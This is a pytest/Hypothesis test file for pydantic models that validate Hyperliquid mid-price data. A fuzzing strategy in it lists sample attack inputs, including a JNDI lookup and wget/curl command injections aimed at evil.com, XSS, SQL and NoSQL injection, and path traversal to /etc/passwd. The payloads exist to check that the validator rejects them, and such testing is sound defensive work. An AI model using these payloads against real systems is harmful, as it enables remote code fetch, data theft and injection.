"""Property-based tests for Hyperliquid raw all mids models.

These tests validate critical security boundary models that process external mid-price data.
The models tested here are essential for price discovery, market data aggregation, and trades.

SECURITY CRITICAL: These raw models protect against:
- Malicious price data that could manipulate trading decisions
- Financial precision errors in mid-price calculations
- Buffer overflow attacks through oversized price dictionaries
- Injection attacks through malformed symbol/price data
- Price manipulation through invalid mid values
- Symbol manipulation that could affect asset identification

Property testing ensures comprehensive coverage of price edge cases and adversarial inputs.
"""

import json
from decimal import Decimal
from typing import Literal

import pytest
from hypothesis import assume, given, strategies as st
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.exceptions.field_validation import TypeFieldError
from cyberdelta.apis.hyperliquid.models.hl_raw_all_mids import (
    HyperliquidRawAllMids,
    HyperliquidRawAllMidsRequestPayload,
    HyperliquidRawAllMidsWrapper,
)
from cyberdelta.exceptions.parsing import EmptyStringError


# Type alias for malicious input types to avoid long lines
MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None

# =============================================================================
# HYPOTHESIS STRATEGIES FOR ALL MIDS MODEL TESTING
# =============================================================================


def asset_symbol_strategy() -> SearchStrategy[str]:
    """Generate valid asset symbol strings.

    Returns:
        SearchStrategy[str]: Strategy for generating valid asset symbols.
    """
    return st.one_of([
        # Common cryptocurrencies
        st.sampled_from([
            "BTC",
            "ETH",
            "SOL",
            "USDC",
            "USDT",
            "AVAX",
            "ATOM",
            "DOT",
            "LINK",
            "UNI",
            "MATIC",
            "ADA",
            "XRP",
            "DOGE",
            "SHIB",
            "FTM",
            "NEAR",
            "ALGO",
            "MANA",
            "SAND",
            "APE",
            "AAVE",
            "CRV",
            "SNX",
            "1INCH",
        ]),
        # Generated asset names
        st.text(
            min_size=1,
            max_size=64,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="-_./:"
            ),
        ).filter(lambda x: x.strip() and len(x.encode("utf-8")) <= 64),
        # Special format symbols
        st.sampled_from([
            "BTC-USD",
            "ETH-USDC",
            "BTC/USD",
            "wBTC",
            "stETH",
            "USDC.e",
            "tBTC",  # Testnet
            "DROP TABLE users;",  # SQL injection test (valid as a symbol)
            "ΞTH",  # Unicode
            "BTC USD",  # With space
            "BTC-USD!@#",  # Special chars
        ]),
    ])


def mid_price_strategy() -> SearchStrategy[str]:
    """Generate valid mid-price decimal strings.

    Returns:
        SearchStrategy[str]: Strategy for generating valid mid-price decimal strings.
    """
    return st.one_of([
        # Common price values
        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
        st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=6).map(str),
        # Common values
        st.just("0"),  # Zero price
        st.just("0.01"),  # Small price
        st.just("1.0"),  # Unit price
        st.just("100.0"),  # Standard price
        st.just("1234.56"),  # Common price format
        st.just("50000.123456"),  # High-precision price
        st.just("0.00000001"),  # Minimum precision
        # Scientific notation (valid for decimal parsing)
        st.just("1e2"),
        st.just("1.5e3"),
        st.just("2.5e-4"),
        st.just("1e1000"),  # Very large
        # Negative prices (may be valid for some derivatives)
        st.just("-1.0"),
        st.just("-100.5"),
        # Padded zeros
        st.just("0003000.00"),
        st.just(" 3000.0 "),  # With whitespace
    ])


@st.composite
def valid_all_mids_data(draw: st.DrawFn, num_assets: int | None = None) -> dict[str, str]:
    """Generate valid all mids data.

    Returns:
        dict[str, str]: Dictionary mapping asset symbols to mid prices.
    """
    if num_assets is None:
        num_assets = draw(st.integers(min_value=0, max_value=100))

    # Generate unique symbols
    symbols: set[str] = set()
    while len(symbols) < num_assets:
        symbol = draw(asset_symbol_strategy())
        if symbol:  # Skip empty strings
            symbols.add(symbol)

    # Generate prices for each symbol
    mids_data: dict[str, str] = {}
    for symbol in symbols:
        price = draw(mid_price_strategy())
        mids_data[symbol] = price

    return mids_data


@st.composite
def valid_all_mids_wrapper_data(draw: st.DrawFn) -> dict[Literal["mids"], dict[str, str]]:
    """Generate valid all mids wrapper data for WebSocket messages.

    Returns:
        dict[Literal["mids"], dict[str, str]]: Wrapper data for WebSocket messages.
    """
    mids_data = draw(valid_all_mids_data())
    return {"mids": mids_data}


def malicious_mids_strategy() -> SearchStrategy[MaliciousInput]:
    """Generate malicious values for all mids security testing.

    Returns:
        SearchStrategy[MaliciousInput]: Strategy for generating malicious input values.
    """
    return st.one_of([
        # Price manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-prices}"),
        st.just("999999999999999999999999999999.99"),  # Overflow attempt
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('mids-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE mids;--"),
        st.just("1' UNION SELECT * FROM prices--"),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        st.just("M" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.prices.find(); //"),
        # JSON injection
        st.just('{"$where": "this.price > 1000000"}'),
        # Price manipulation
        st.just("1000.0'; UPDATE prices SET price=0;--"),
        # Invalid decimals
        st.just("NaN"),
        st.just("inf"),
        st.just("-inf"),
        st.just("Infinity"),
        st.just("not_a_number"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
    ])


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW ALL MIDS MODEL
# =============================================================================


class TestHyperliquidRawAllMidsProperties:
    """Property-based tests for HyperliquidRawAllMids validation and security."""

    @given(mids_data=valid_all_mids_data())
    def test_all_mids_validation_success_properties(self, mids_data: dict[str, str]) -> None:
        """Property: Valid data should create valid HyperliquidRawAllMids."""
        # Skip invalid data
        for symbol, price in mids_data.items():
            try:
                # Validate symbol
                assume(symbol.strip())
                assume(len(symbol.encode("utf-8")) <= 64)

                # Validate price
                assume(price.strip())
                decimal_val = Decimal(price.strip())
                assume(decimal_val.is_finite())

            except (ValueError, TypeError):
                assume(False)

        obj = HyperliquidRawAllMids.model_validate(mids_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawAllMids)

        # Property: All symbols should be preserved
        assert len(obj.root) == len(mids_data)
        for symbol in mids_data:
            assert symbol in obj.root

        # Property: Model should be configured correctly
        assert obj.model_config.get("frozen") is True

    @given(
        mids_data=valid_all_mids_data(num_assets=1),
        malicious_value=malicious_mids_strategy(),
    )
    def test_all_mids_security_boundary_properties(
        self,
        mids_data: dict[str, str],
        malicious_value: MaliciousInput,
    ) -> None:
        """Property: All mids model should reject malicious inputs."""
        # Skip if empty
        assume(len(mids_data) > 0)

        # Replace one value with malicious input
        symbol = next(iter(mids_data.keys()))
        mids_data_malicious: dict[str, object] = dict(mids_data)
        mids_data_malicious[symbol] = malicious_value

        # Property: Malicious price should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawAllMids.model_validate(mids_data_malicious)

    @given(malicious_symbol=malicious_mids_strategy(), price=mid_price_strategy())
    def test_all_mids_malicious_symbol_properties(
        self,
        malicious_symbol: MaliciousInput,
        price: str,
    ) -> None:
        """Property: All mids model should reject malicious symbols safely."""
        # Skip valid strings that might pass
        if (
            isinstance(malicious_symbol, str)
            and malicious_symbol.strip()
            and len(malicious_symbol.encode("utf-8")) <= 64
        ):
            assume(False)  # Skip potentially valid symbols

        # Convert to string key for dict (testing malicious input handling)
        try:
            symbol_key = str(malicious_symbol)
        except (UnicodeError, AttributeError, TypeError):
            symbol_key = repr(malicious_symbol)
        mids_data = {symbol_key: price}

        # Property: Malicious symbol should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawAllMids.model_validate(mids_data)

    @given(
        symbol=asset_symbol_strategy(),
        price=st.one_of([
            st.just(""),  # Empty string
            st.just("   "),  # Whitespace only
            st.just("NaN"),  # Not a number
            st.just("inf"),  # Infinity
            st.just("-inf"),  # Negative infinity
            st.just("Infinity"),
            st.just("not_a_number"),
            st.just("1..0"),  # Invalid decimal
            st.text(min_size=65, max_size=100),  # Too long
        ]),
    )
    def test_all_mids_invalid_price_validation_properties(self, symbol: str, price: str) -> None:
        """Property: All mids should validate price constraints properly."""
        # Skip invalid symbols
        assume(symbol.strip() and len(symbol.encode("utf-8")) <= 64)

        mids_data = {symbol: price}

        try:
            # Check if the price can be parsed as a finite decimal
            decimal_val = Decimal(price.strip() if price else "")
            is_finite = decimal_val.is_finite()
            is_empty = not price.strip()
            is_too_long = len(price.encode("utf-8")) > 64

            if is_finite and not is_empty and not is_too_long:
                # Property: Valid finite decimals should be accepted
                obj = HyperliquidRawAllMids.model_validate(mids_data)
                assert symbol in obj.root
            else:
                # Property: Non-finite, empty, or too long values should be rejected
                with pytest.raises((ValidationError, EmptyStringError, TypeFieldError)):
                    HyperliquidRawAllMids.model_validate(mids_data)

        except (ValueError, TypeError):
            # Property: Unparseable price strings should be rejected
            with pytest.raises((ValidationError, TypeFieldError)):
                HyperliquidRawAllMids.model_validate(mids_data)

    @given(num_assets=st.integers(min_value=0, max_value=1000))
    def test_all_mids_size_properties(self, num_assets: int) -> None:
        """Property: All mids should handle various dictionary sizes."""
        mids_data = {f"ASSET{i}": str(i) for i in range(num_assets)}

        obj = HyperliquidRawAllMids.model_validate(mids_data)

        # Property: All assets should be preserved
        assert len(obj.root) == num_assets
        for i in range(num_assets):
            assert f"ASSET{i}" in obj.root
            assert obj.root[f"ASSET{i}"] == str(i)

    def test_all_mids_empty_dict_properties(self) -> None:
        """Property: Empty dictionary should be valid for all mids."""
        mids_data: dict[str, str] = {}
        obj = HyperliquidRawAllMids.model_validate(mids_data)
        assert obj.root == {}

    @given(
        invalid_input=st.one_of([
            st.lists(st.text()),  # List instead of dict
            st.text(),  # String instead of dict
            st.integers(),  # Integer instead of dict
            st.floats(),  # Float instead of dict
            st.booleans(),  # Boolean instead of dict
            st.none(),  # None instead of dict
        ])
    )
    def test_all_mids_type_validation_properties(
        self, invalid_input: list[str] | str | float | bool | None
    ) -> None:
        """Property: All mids should reject non-dictionary inputs."""
        with pytest.raises((ValidationError, TypeError, TypeFieldError)):
            HyperliquidRawAllMids.model_validate(invalid_input)

    @given(mids_data=valid_all_mids_data())
    def test_all_mids_decimal_normalization_properties(self, mids_data: dict[str, str]) -> None:
        """Property: All mids should normalize decimal strings consistently."""
        # Skip invalid data
        for symbol, price in mids_data.items():
            try:
                assume(symbol.strip())
                assume(price.strip())
                decimal_val = Decimal(price.strip())
                assume(decimal_val.is_finite())
            except (ValueError, TypeError):
                assume(False)

        obj = HyperliquidRawAllMids.model_validate(mids_data)

        # Property: Prices should be normalized (trailing zeros removed)
        for symbol, original_price in mids_data.items():
            stored_price = obj.root[symbol]
            # Check that the stored value represents the same decimal
            assert Decimal(stored_price) == Decimal(original_price.strip())


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW ALL MIDS REQUEST PAYLOAD MODEL
# =============================================================================


class TestHyperliquidRawAllMidsRequestPayloadProperties:
    """Property-based tests for all mids request payload validation."""

    def test_all_mids_request_valid_properties(self) -> None:
        """Property: Valid all mids request should create valid payload."""
        payload_data = {"type": "allMids"}
        obj = HyperliquidRawAllMidsRequestPayload.model_validate(payload_data)

        assert isinstance(obj, HyperliquidRawAllMidsRequestPayload)
        assert obj.type == "allMids"

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(
        request_type=st.one_of([
            st.just("allMids"),
            st.just("allmids"),
            st.just("AllMids"),
            st.just("all_mids"),
            st.just("mids"),
            st.just("invalid"),
            st.just(""),
        ])
    )
    def test_all_mids_request_type_validation_properties(self, request_type: str) -> None:
        """Property: All mids request type field should validate against literal value."""
        payload_data = {"type": request_type}

        if request_type == "allMids":
            # Property: Valid type should be accepted
            obj = HyperliquidRawAllMidsRequestPayload.model_validate(payload_data)
            assert obj.type == "allMids"
        else:
            # Property: Invalid types should be rejected
            with pytest.raises(ValidationError):
                HyperliquidRawAllMidsRequestPayload.model_validate(payload_data)

    @given(
        extra_fields=st.dictionaries(
            st.text(min_size=1, max_size=20),
            st.text(min_size=1, max_size=20),
            min_size=1,
            max_size=5,
        )
    )
    def test_all_mids_request_extra_fields_properties(self, extra_fields: dict[str, str]) -> None:
        """Property: All mids request should forbid extra fields."""
        payload_data = {"type": "allMids"}
        payload_data.update(extra_fields)

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawAllMidsRequestPayload.model_validate(payload_data)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW ALL MIDS WRAPPER MODEL
# =============================================================================


class TestHyperliquidRawAllMidsWrapperProperties:
    """Property-based tests for WebSocket all mids wrapper validation."""

    @given(wrapper_data=valid_all_mids_wrapper_data())
    def test_all_mids_wrapper_validation_success_properties(
        self, wrapper_data: dict[Literal["mids"], dict[str, str]]
    ) -> None:
        """Property: Valid wrapper data should create valid HyperliquidRawAllMidsWrapper."""
        # Skip invalid data
        mids_data = wrapper_data["mids"]
        for symbol, price in mids_data.items():
            try:
                assume(symbol.strip())
                assume(len(symbol.encode("utf-8")) <= 64)
                assume(price.strip())
                decimal_val = Decimal(price.strip())
                assume(decimal_val.is_finite())
            except (ValueError, TypeError):
                assume(False)

        obj = HyperliquidRawAllMidsWrapper.model_validate(wrapper_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawAllMidsWrapper)
        assert "mids" in obj.root
        assert len(obj.root["mids"]) == len(mids_data)

    @given(mids_data=valid_all_mids_data())
    def test_all_mids_wrapper_missing_key_properties(self, mids_data: dict[str, str]) -> None:
        """Property: Wrapper should reject data without 'mids' key."""
        # Try to pass raw mids data without wrapper
        with pytest.raises(ValidationError):
            HyperliquidRawAllMidsWrapper.model_validate(mids_data)

    @given(
        invalid_wrapper=st.one_of([
            st.just({"wrong_key": {}}),
            st.just({"mids": "not_a_dict"}),
            st.just({"mids": None}),
            st.just({"mids": []}),
        ])
    )
    def test_all_mids_wrapper_invalid_structure_properties(
        self, invalid_wrapper: dict[str, str | list[object] | None]
    ) -> None:
        """Property: Wrapper should reject invalid structures."""
        with pytest.raises(ValidationError):
            HyperliquidRawAllMidsWrapper.model_validate(invalid_wrapper)


# =============================================================================
# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
# =============================================================================


class TestHyperliquidRawAllMidsIntegrationProperties:
    """Integration property tests for all mids models working together."""

    @given(
        mids_data=valid_all_mids_data(),
        malicious_entries=st.dictionaries(
            malicious_mids_strategy(),
            malicious_mids_strategy(),
            min_size=1,
            max_size=3,
        ),
    )
    def test_all_mids_models_adversarial_input_properties(
        self,
        mids_data: dict[str, str],
        malicious_entries: dict[
            str | int | float | bool | list[str] | dict[str, str] | bytes | None,
            str | int | float | bool | list[str] | dict[str, str] | bytes | None,
        ],
    ) -> None:
        """Property: All mids models should safely handle adversarial input."""
        # Mix valid and malicious data
        # Convert malicious entries to have string keys for type compatibility
        string_malicious_entries = {str(k): v for k, v in malicious_entries.items()}
        mixed_data: dict[str, object] = {**mids_data, **string_malicious_entries}

        # Property: Mixed adversarial input should be rejected
        with pytest.raises((ValidationError, TypeError, TypeFieldError, EmptyStringError)):
            HyperliquidRawAllMids.model_validate(mixed_data)

    @given(mids_data=valid_all_mids_data())
    def test_all_mids_json_serialization_properties(self, mids_data: dict[str, str]) -> None:
        """Property: All mids models should maintain JSON serialization compatibility."""
        # Skip invalid data
        for symbol, price in mids_data.items():
            try:
                assume(symbol.strip())
                assume(price.strip())
                decimal_val = Decimal(price.strip())
                assume(decimal_val.is_finite())
            except (ValueError, TypeError):
                assume(False)

        # Test direct model serialization
        obj = HyperliquidRawAllMids.model_validate(mids_data)
        json_str = obj.model_dump_json()
        parsed_json = json.loads(json_str)
        reconstructed = HyperliquidRawAllMids.model_validate(parsed_json)
        assert len(reconstructed.root) == len(obj.root)

        # Test wrapper serialization
        wrapper_data = {"mids": mids_data}
        wrapper_obj = HyperliquidRawAllMidsWrapper.model_validate(wrapper_data)
        wrapper_json = wrapper_obj.model_dump_json()
        wrapper_parsed = json.loads(wrapper_json)
        wrapper_reconstructed = HyperliquidRawAllMidsWrapper.model_validate(wrapper_parsed)
        assert len(wrapper_reconstructed.root["mids"]) == len(wrapper_obj.root["mids"])


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_HyperliquidRawAllMids_real_world_example() -> None:
    """Test with real-world all mids data."""
    payload = {"ETH": "3000.0", "BTC": "40000.0", "SOL": "150.5"}
    obj = HyperliquidRawAllMids.model_validate(payload)
    # Decimal normalization may occur
    assert "ETH" in obj.root
    assert "BTC" in obj.root
    assert "SOL" in obj.root


def test_HyperliquidRawAllMids_empty_dict() -> None:
    """Test with empty dictionary."""
    payload: dict[str, str] = {}
    obj = HyperliquidRawAllMids.model_validate(payload)
    assert obj.root == {}


def test_HyperliquidRawAllMids_many_assets() -> None:
    """Test with many assets."""
    payload = {f"ASSET{i}": str(i * 100) for i in range(50)}
    obj = HyperliquidRawAllMids.model_validate(payload)
    assert len(obj.root) == 50
    assert obj.root["ASSET10"] == "1000"


def test_HyperliquidRawAllMids_unicode_symbols() -> None:
    """Test with unicode symbols."""
    payload = {"ΞTH": "3000.0", "₿TC": "40000.0"}
    obj = HyperliquidRawAllMids.model_validate(payload)
    assert "ΞTH" in obj.root
    assert "₿TC" in obj.root


def test_HyperliquidRawAllMids_special_chars_in_symbol() -> None:
    """Test with special characters in symbols."""
    payload = {
        "BTC-USD": "40000.0",
        "ETH/USDC": "3000.0",
        "wBTC": "40100.0",
        "USDC.e": "1.0",
    }
    obj = HyperliquidRawAllMids.model_validate(payload)
    assert "BTC-USD" in obj.root
    assert "ETH/USDC" in obj.root
    assert "wBTC" in obj.root
    assert "USDC.e" in obj.root


def test_HyperliquidRawAllMids_decimal_normalization() -> None:
    """Test decimal normalization."""
    payload = {
        "ETH": "3000.00",  # Trailing zeros
        "BTC": "0040000.0",  # Leading zeros
        "SOL": "150.123456789012345678901234567890",  # Excessive precision
    }
    obj = HyperliquidRawAllMids.model_validate(payload)
    # Business logic normalizes decimals
    assert Decimal(obj.root["ETH"]) == Decimal(3000)
    assert Decimal(obj.root["BTC"]) == Decimal(40000)
    # Excessive precision may be rounded
    sol_tuple = Decimal(obj.root["SOL"]).as_tuple()
    assert isinstance(sol_tuple.exponent, int)
    assert sol_tuple.exponent >= -8


def test_HyperliquidRawAllMids_scientific_notation() -> None:
    """Test with scientific notation prices."""
    payload: dict[str, str] = {
        "BTC": "1e5",  # 100000
        "ETH": "3.5e3",  # 3500
        "TINY": "1e-8",  # 0.00000001
    }
    obj = HyperliquidRawAllMids.model_validate(payload)
    assert "BTC" in obj.root
    assert "ETH" in obj.root
    assert "TINY" in obj.root


def test_HyperliquidRawAllMids_negative_prices() -> None:
    """Test with negative prices (may be valid for some derivatives)."""
    payload = {"PERP": "-100.5", "FUTURE": "-0.01"}
    obj = HyperliquidRawAllMids.model_validate(payload)
    assert obj.root["PERP"] == "-100.5"
    assert obj.root["FUTURE"] == "-0.01"


def test_HyperliquidRawAllMids_zero_price() -> None:
    """Test with zero price."""
    payload = {"DEAD": "0", "ZERO": "0.0"}
    obj = HyperliquidRawAllMids.model_validate(payload)
    assert "DEAD" in obj.root
    assert "ZERO" in obj.root


def test_HyperliquidRawAllMids_whitespace_handling() -> None:
    """Test with whitespace in prices."""
    payload = {"ETH": " 3000.0 ", "BTC": "\t40000.0\n"}
    obj = HyperliquidRawAllMids.model_validate(payload)
    # Whitespace should be handled
    assert "ETH" in obj.root
    assert "BTC" in obj.root


def test_HyperliquidRawAllMids_empty_string_symbol() -> None:
    """Test validation fails for empty string symbol."""
    payload = {"": "3000.0"}
    with pytest.raises(EmptyStringError):
        HyperliquidRawAllMids.model_validate(payload)


def test_HyperliquidRawAllMids_empty_string_price() -> None:
    """Test validation fails for empty string price."""
    payload = {"ETH": ""}
    with pytest.raises(EmptyStringError):
        HyperliquidRawAllMids.model_validate(payload)


def test_HyperliquidRawAllMids_invalid_price_nan() -> None:
    """Test validation fails for NaN price."""
    payload = {"ETH": "NaN"}
    with pytest.raises(ValidationError):
        HyperliquidRawAllMids.model_validate(payload)


def test_HyperliquidRawAllMids_invalid_price_infinity() -> None:
    """Test validation fails for infinity price."""
    payload = {"ETH": "inf"}
    with pytest.raises(ValidationError):
        HyperliquidRawAllMids.model_validate(payload)


def test_HyperliquidRawAllMids_invalid_price_string() -> None:
    """Test validation fails for non-numeric price."""
    payload = {"ETH": "not_a_number"}
    with pytest.raises(ValidationError):
        HyperliquidRawAllMids.model_validate(payload)


def test_HyperliquidRawAllMids_non_dict_input() -> None:
    """Test validation fails for non-dictionary input."""
    with pytest.raises(TypeFieldError):
        HyperliquidRawAllMids.model_validate(["ETH", "BTC"])

    with pytest.raises(TypeFieldError):
        HyperliquidRawAllMids.model_validate("not_a_dict")

    with pytest.raises(TypeFieldError):
        HyperliquidRawAllMids.model_validate(None)


def test_HyperliquidRawAllMids_symbol_too_long() -> None:
    """Test validation fails for symbol exceeding max length."""
    payload = {"A" * 65: "3000.0"}
    with pytest.raises(ValidationError):
        HyperliquidRawAllMids.model_validate(payload)


def test_HyperliquidRawAllMids_price_too_long() -> None:
    """Test validation fails for price exceeding max length."""
    payload = {"ETH": "1" * 65}
    with pytest.raises(ValidationError):
        HyperliquidRawAllMids.model_validate(payload)


def test_HyperliquidRawAllMidsRequestPayload_real_world_example() -> None:
    """Test with real-world request payload."""
    payload = {"type": "allMids"}
    obj = HyperliquidRawAllMidsRequestPayload.model_validate(payload)
    assert obj.type == "allMids"


def test_HyperliquidRawAllMidsWrapper_real_world_example() -> None:
    """Test with real-world WebSocket wrapper data."""
    payload = {
        "mids": {
            "BTC": "108019.5",
            "ETH": "2545.5",
            "SOL": "150.25",
        }
    }
    obj = HyperliquidRawAllMidsWrapper.model_validate(payload)
    assert "mids" in obj.root
    assert len(obj.root["mids"]) == 3
    assert "BTC" in obj.root["mids"]
    assert "ETH" in obj.root["mids"]
    assert "SOL" in obj.root["mids"]


def test_HyperliquidRawAllMidsWrapper_empty_mids() -> None:
    """Test wrapper with empty mids dictionary."""
    payload: dict[str, dict[str, str]] = {"mids": {}}
    obj = HyperliquidRawAllMidsWrapper.model_validate(payload)
    assert obj.root["mids"] == {}


def test_HyperliquidRawAllMidsWrapper_missing_mids_key() -> None:
    """Test wrapper validation fails without 'mids' key."""
    payload = {"wrong_key": {"BTC": "40000.0"}}
    with pytest.raises(ValidationError):
        HyperliquidRawAllMidsWrapper.model_validate(payload)


def test_HyperliquidRawAllMidsWrapper_invalid_mids_type() -> None:
    """Test wrapper validation fails with invalid mids type."""
    payload = {"mids": "not_a_dict"}
    with pytest.raises(ValidationError):
        HyperliquidRawAllMidsWrapper.model_validate(payload)
